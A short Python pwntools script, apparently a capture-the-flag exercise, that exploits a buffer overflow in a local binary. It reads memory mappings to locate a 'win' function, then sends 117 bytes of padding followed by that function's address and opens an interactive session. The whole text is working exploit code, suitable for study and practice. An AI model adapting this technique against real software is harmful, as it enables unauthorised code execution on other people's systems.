from pwn import *
from pprint import *

# Generate a cyclic pattern so that we can auto-find the offset
payload = b'S'*128

proc = './a.out'

io = process(proc)
io.recvline()
core = io.corefile

pp = PrettyPrinter(indent=4, width=80)
print(hex(core.mappings[0].start))

elf = ELF(proc)
pp.pprint(core.mappings)
# pp.pprint(elf.symbols)
win = elf.symbols.win
print("win():", str(hex(core.mappings[0].start + win)))
payload = b"A" * 117 + p32(core.mappings[0].start + win)

# Get a shell!
io.sendline(payload)
io.interactive()
